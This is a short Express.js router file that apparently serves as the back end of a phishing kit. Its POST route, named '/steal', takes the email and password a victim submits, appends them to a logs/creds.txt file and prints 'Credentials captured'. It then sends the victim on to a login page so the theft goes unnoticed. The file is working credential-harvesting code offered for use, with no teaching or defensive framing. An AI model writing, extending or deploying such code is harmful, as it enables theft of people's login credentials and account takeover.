import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";

const router = express.Router();
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const logsPath = path.join(__dirname, "../logs/creds.txt");
router.post("/steal", (req, res) => {
  const { email, password } = req.body;

  const log = `Email: ${email} | Password: ${password}\n`;

  fs.appendFile(logsPath, log, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return res.status(500).send("Error occurred.");
    }

    console.log(`📝 Credentials captured: ${email}`);
    res.redirect("https://example.com/login");
  });
});

export default router;
